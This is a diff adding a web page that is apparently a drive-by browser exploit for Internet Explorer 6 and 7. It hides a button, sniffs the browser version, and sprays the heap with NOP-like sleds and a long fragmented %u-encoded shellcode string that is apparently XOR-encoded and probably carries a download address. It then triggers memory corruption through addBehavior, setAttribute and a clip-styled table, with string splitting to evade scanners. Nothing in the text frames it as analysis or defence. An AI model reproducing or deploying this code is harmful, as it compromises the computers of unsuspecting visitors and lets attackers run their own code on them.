@@ -1,0 +1,66 @@
+
+
+<BUTTON id=netboom style='DISPLAY: none' onclick=a1();></BUTTON>
+<script src='b.js'></script>
+<SCRIPT language='javascript'>
+
+var a3 = nb5();
+var a4 = nb6(a3);
+
+function nb1(){
+nbLuck = new Array();
+var nbPower = 0x86000-(a4.length*2);
+var nbNop = nb4('0'+'c'+'0'+'c');
+	nbNop = nbNop + nbNop;
+while(nbNop.length<nbPower/2) { nbNop+=nbNop; }
+var nbSize = nbNop.substring(0,nbPower/2);
+delete nbNop;
+for(nbx=0; nbx<270; nbx++) {
+nbLuck[nbx] = nbSize + nbSize + a4;}}
+function a1()
+{
+nb1();
+var a7 = document.createElement(nbD);
+a7.addBehavior(nbC);
+document.appendChild(a7);
+try 
+{
+i=0;
+while(i<10)
+{
+a7.setAttribute('s',window);
+i++;
+}
+} catch(e){ }
+window.status+='';
+}
+
+if(navigator.userAgent.toLowerCase().indexOf("m"+"s"+"i"+"e 6")>0){ addr = 241748; document.getElementById('netboom').onclick(); }else if(navigator.userAgent.toLowerCase().indexOf("m"+"s"+"i"+"e 7")>0){ addr = 733120; }
+
+function nb3(bytes, mystr, nbstr) { while (mystr.length< bytes){ mystr += mystr; } return mystr.substr(0, (bytes-6)/2) + nbstr; } 
+
+var nbwmHaha = new Array();
+
+var nbwmXixi = nb4("0"+"d0"+"d");
+	nbwmXixi = nbwmXixi + nbwmXixi;
+
+nbwmXixi = nb3(addr, nbwmXixi, a4);
+
+var n = 0;
+
+while(n < 1000){  
+    nbwmHaha[n] = nbwmXixi.substr(0, nbwmXixi.length);
+	n++;
+}
+
+document.write("<"+"t"+"a"+"b"+"l"+"e "+"s"+"t"+"y"+"l"+"e"+"=p"+"o"+"s"+"it"+"io"+"n:"+"a"+"b"+"s"+"o"+"l"+"u"+"t"+"e;"+"c"+"li"+"p:"+"r"+"e"+"ct"+"("+"0)>");
+
+function nb5() { 
+
+var nb719288="";nb719288+="%u58";nb719288+="58%u585";nb719288+="8%u10EB";nb719288+="%u4B5B%";nb719288+="uC933%u";nb719288+="B966%u0";nb719288+="3B8%u34";nb719288+="80%uBD0";nb719288+="B%uFAE2";nb719288+="%u05EB%";nb719288+="uEBE8%u";nb719288+="FFFF%u5";nb719288+="4FF%uBE";nb719288+="A3%uBDB";nb719288+="D%uD9E2";nb719288+="%u8D1C%";nb719288+="uBDBD%u";nb719288+="36BD%uB";nb719288+="1FD%uCD";nb719288+="36%u10A";nb719288+="1%uD536";nb719288+="%u36B5%";nb719288+="uD74A%u";nb719288+="E4AC%u0";nb719288+="355%uBD";nb719288+="BF%u2DB";nb719288+="D%u455F";nb719288+="%u8ED5%";nb719288+="uBD8F%u";nb719288+="D5BD%uC";nb719288+="EE8%uCF";nb719288+="D8%u36E";nb719288+="9%uB1FB";nb719288+="%u0355%";nb719288+="uBDBC%u";nb719288+="36BD%uD";nb719288+="755%uE4";nb719288+="B8%u235";nb719288+="5%uBDBF";nb719288+="%u5FBD%";nb719288+="uD544%u";nb719288+="D3D2%uB";nb719288+="DBD%uC8";nb719288+="D5%uD1C";nb719288+="F%uE9D0";nb719288+="%uAB42%";nb719288+="u7D38%u";nb719288+="AEC8%uD";nb719288+="2D5%uBD";nb719288+="D3%uD5B";nb719288+="D%uCFC8";nb719288+="%uD0D1%";nb719288+="u36E9%u";nb719288+="B1FB%u3";nb719288+="355%uBD";nb719288+="BC%u36B";nb719288+="D%uD755";nb719288+="%uE4BC%";nb719288+="uD355%u";nb719288+="BDBF%u5";nb719288+="FBD%uD5";nb719288+="44%u8ED";nb719288+="1%uBD8F";nb719288+="%uCED5%";nb719288+="uD8D5%u";nb719288+="E9D1%uF";nb719288+="B36%u55";nb719288+="B1%uBCD";nb719288+="2%uBDBD";nb719288+="%u5536%";nb719288+="uBCD7%u";nb719288+="55E4%uB";nb719288+="FF2%uBD";nb719288+="BD%u445";nb719288+="F%u513C";nb719288+="%uBCBD%";nb719288+="uBDBD%u";nb719288+="6136%u7";nb719288+="E3C%uBD";nb719288+="3D%uBDB";nb719288+="D%uBDD7";nb719288+="%uA7D7%";nb719288+="uD7EE%u";nb719288+="42BD%uE";nb719288+="1EB%u7D";nb719288+="8E%u3DF";nb719288+="D%uBE81";nb719288+="%uC8BD%";nb719288+="u7A44%u";nb719288+="BEB9%u8";nb719288+="EE1%uCE";nb719288+="93%uF97";nb719288+="A%uB9BE";nb719288+="%uCFDE%";nb719288+="uBDBD%u";nb719288+="748E%uE";nb719288+="CEC%uEA";nb719288+="EE%u8EE";nb719288+="C%u367D";nb719288+="%uE5FB%";nb719288+="u9F55%u";nb719288+="BDBC%u3";nb719288+="EBD%uBD";nb719288+="45%u1E5";nb719288+="4%uBDBD";nb719288+="%u2DBD%";nb719288+="uBDD7%u";nb719288+="BDD7%uB";nb719288+="ED7%uBD";nb719288+="D7%uBFD";nb719288+="7%uBDD5";nb719288+="%uBDBD%";nb719288+="uEE7D%u";nb719288+="FB36%u5";nb719288+="599%uBC";nb719288+="BC%uBDB";nb719288+="D%uFB34";nb719288+="%uD7DD%";nb719288+="uEDBD%u";nb719288+="EB42%u3";nb719288+="495%uD9";nb719288+="FB%uFB3";nb719288+="6%uD7DD";nb719288+="%uD7BD%";nb719288+="uD7BD%u";nb719288+="D7BD%uD";nb719288+="7B9%uED";nb719288+="BD%uEB4";nb719288+="2%uD791";nb719288+="%uD7BD%";nb719288+="uD7BD%u";nb719288+="D5BD%uB";nb719288+="DA2%uBD";nb719288+="B2%u42E";nb719288+="D%u81EB";nb719288+="%uFB34%";nb719288+="u36C5%u";nb719288+="D9F3%uC";nb719288+="13D%u42";nb719288+="B5%uC90";nb719288+="9%u3DB1";nb719288+="%uB5C1%";nb719288+="uBD42%u";nb719288+="B8C9%uC";nb719288+="93D%u42";nb719288+="B5%u5F0";nb719288+="9%u3456";nb719288+="%u3D3B%";nb719288+="uBDBD%u";nb719288+="7ABD%uC";nb719288+="DFB%uBD";nb719288+="BD%uBDB";nb719288+="D%uFB7A";nb719288+="%uBDC9%";nb719288+="uBDBD%u";nb719288+="D7BD%uD";nb719288+="7BD%uD7";nb719288+="BD%u36B";nb719288+="D%uDDFB";nb719288+="%u42ED%";nb719288+="u85EB%u";nb719288+="3B36%uB";nb719288+="D3D%uBD";nb719288+="BD%uBDD";nb719288+="7%uF330";nb719288+="%uECC9%";nb719288+="uCB42%u";nb719288+="EDCD%uC";nb719288+="B42%u42";nb719288+="DD%u8DE";nb719288+="B%uCB42";nb719288+="%u42DD%";nb719288+="u89EB%u";nb719288+="CB42%u4";nb719288+="2C5%uFD";nb719288+="EB%u463";nb719288+="6%u7D8E";nb719288+="%u668E%";nb719288+="u513C%u";nb719288+="BFBD%uB";nb719288+="DBD%u71";nb719288+="36%u453";nb719288+="E%uC0E9";nb719288+="%u34B5%";nb719288+="uBCA1%u";nb719288+="7D3E%u5";nb719288+="6B9%u36";nb719288+="4E%u367";nb719288+="1%u3E64";nb719288+="%uAD7E%";nb719288+="u7D8E%u";nb719288+="ECED%uE";nb719288+="DEE%uED";nb719288+="ED%uEDE";nb719288+="D%uEAED";nb719288+="%uEDED%";nb719288+="uEB42%u";nb719288+="36B5%uE";nb719288+="9C3%uAD";nb719288+="55%uBDB";nb719288+="C%u55BD";nb719288+="%uBDD8%";nb719288+="uBDBD%u";nb719288+="DED5%uC";nb719288+="ACB%uD5";nb719288+="BD%uD5C";nb719288+="E%uD2D9";nb719288+="%u36E9%";nb719288+="uB1FB%u";nb719288+="9955%uB";nb719288+="DBD%u34";nb719288+="BD%u81F";nb719288+="B%u1CD9";nb719288+="%uBDB9%";nb719288+="uBDBD%u";nb719288+="1D30%u4";nb719288+="2DD%u42";nb719288+="42%uD8D";nb719288+="7%uCB42";nb719288+="%u3681%";nb719288+="uADFB%u";nb719288+="B555%uB";nb719288+="DBD%u8E";nb719288+="BD%uEE6";nb719288+="6%uEEEE";nb719288+="%u42EE%";nb719288+="u3D6D%u";nb719288+="5585%u8";nb719288+="53D%uC8";nb719288+="54%u3CA";nb719288+="C%uB8C5";nb719288+="%u2D2D%";nb719288+="u2D2D%u";nb719288+="B5C9%u4";nb719288+="236%u36";nb719288+="E8%u305";nb719288+="1%uB8FD";nb719288+="%u5D42%";nb719288+="u1B55%u";nb719288+="BDBD%u7";nb719288+="EBD%u1D";nb719288+="55%uBDB";nb719288+="D%u05BD";nb719288+="%uBCAC%";nb719288+="u3DB9%u";nb719288+="B17F%u5";nb719288+="5BD%uBD";nb719288+="2E%uBDB";nb719288+="D%u513C";nb719288+="%uBCBD%";nb719288+="uBDBD%u";nb719288+="4136%u7";nb719288+="A3E%u7A";nb719288+="B9%u8FB";nb719288+="A%u2CC9";nb719288+="%u7AB1%";nb719288+="uB9FA%u";nb719288+="34DE%uF";nb719288+="26C%uFA";nb719288+="7A%u1DB";nb719288+="5%u2AD8";nb719288+="%u7A76%";nb719288+="uB1FA%u";nb719288+="FDEC%uC";nb719288+="207%uFA";nb719288+="7A%u83A";nb719288+="D%u0BA0";nb719288+="%u7A84%";nb719288+="uA9FA%u";nb719288+="D405%uA";nb719288+="669%uFA";nb719288+="7A%u03A";nb719288+="5%uDBC2";nb719288+="%u7A1D%";nb719288+="uA1FA%u";nb719288+="1441%u1";nb719288+="08A%uFA";nb719288+="7A%u259";nb719288+="D%uADB7";nb719288+="%uD945%";nb719288+="u8D1C%u";nb719288+="BDBD%u3";nb719288+="6BD%uB1";nb719288+="FD%uCD3";nb719288+="6%u10A1";nb719288+="%uD536%";nb719288+="u36B5%u";nb719288+="D74A%uE";nb719288+="4B9%uE9";nb719288+="55%uBDB";nb719288+="D%u2DBD";nb719288+="%u455F%";nb719288+="u8ED5%u";nb719288+="BD8F%uD";nb719288+="5BD%uCE";nb719288+="E8%uCFD";nb719288+="8%u36E9";nb719288+="%u55BB%";nb719288+="u42E8%u";nb719288+="4242%u5";nb719288+="536%uB8";nb719288+="D7%u55E";nb719288+="4%uBD88";nb719288+="%uBDBD%";nb719288+="u445F%u";nb719288+="428E%u4";nb719288+="2EA%uB9";nb719288+="EB%uBF5";nb719288+="6%u7EE5";nb719288+="%u4455%";nb719288+="u4242%u";nb719288+="E642%uB";nb719288+="A7B%u34";nb719288+="05%uBCE";nb719288+="2%u7ADB";nb719288+="%uB8FA%";nb719288+="u5D42%u";nb719288+="EE7E%u6";nb719288+="136%uD7";nb719288+="EE%uD5F";nb719288+="D%uADBD";nb719288+="%uBDBD%";nb719288+="u36EA%u";nb719288+="9DFB%uA";nb719288+="555%u42";nb719288+="42%uE54";nb719288+="2%uEC7E";nb719288+="%u36EB%";nb719288+="u81C8%u";nb719288+="C936%uC";nb719288+="593%u48";nb719288+="BE%u36E";nb719288+="B%u9DCB";nb719288+="%u48BE%";nb719288+="u748E%u";nb719288+="FCF4%uB";nb719288+="E10%u8E";nb719288+="78%uB26";nb719288+="6%uAD03";nb719288+="%u6B87%";nb719288+="uB5C9%u";nb719288+="767C%uB";nb719288+="EBA%uFD";nb719288+="67%u4C5";nb719288+="6%uA286";nb719288+="%u5AC8%";nb719288+="u36E3%u";nb719288+="99E3%u6";nb719288+="0BE%u36";nb719288+="DB%uF6B";nb719288+="1%uE336";nb719288+="%uBEA1%";nb719288+="u3660%u";nb719288+="36B9%u7";nb719288+="8BE%uE3";nb719288+="16%u7EE";nb719288+="4%u6055";nb719288+="%u4241%";nb719288+="u0F42%u";nb719288+="5F4F%u8";nb719288+="449%uC0";nb719288+="5F%u673";nb719288+="E%uC6F5";nb719288+="%u8F80%";nb719288+="u2CC9%u";nb719288+="38B1%u1";nb719288+="262%uDE";nb719288+="06%u6C3";nb719288+="4%uECF2";nb719288+="%u07FD%";nb719288+="u1DC2%u";nb719288+="2AD8%uA";nb719288+="376%uD9";nb719288+="19%u2E5";nb719288+="2%u598F";nb719288+="%u3329%";nb719288+="uB7AE%u";nb719288+="7F11%uF";nb719288+="6A4%u79";nb719288+="BC%uA23";nb719288+="0%uEAC9";nb719288+="%uB0DB%";nb719288+="uFE42%u";nb719288+="1103%uC";nb719288+="066%u18";nb719288+="4D%uEF2";nb719288+="7%u1A43";nb719288+="%u8367%";nb719288+="u0BA0%u";nb719288+="0584%u6";nb719288+="9D4%u03";nb719288+="A6%uDBC";nb719288+="2%u411D";nb719288+="%u8A14%";nb719288+="u2510%u";nb719288+="ADB7%u3";nb719288+="D45%u12";nb719288+="6B%u462";nb719288+="7%uA8EE";nb719288+="%ud5db%";nb719288+="uc9c9%u";nb719288+="87cd%u9";nb719288+="292%uda";nb719288+="de%ud4d";nb719288+="b%ud0d1";nb719288+="%ude93%u93d2%ucfd6%ude92%ucece%u8d92%u8c8a%ude93%ucece%ubdbd";
+
+	return nb719288;
+
+}
+
+</SCRIPT>
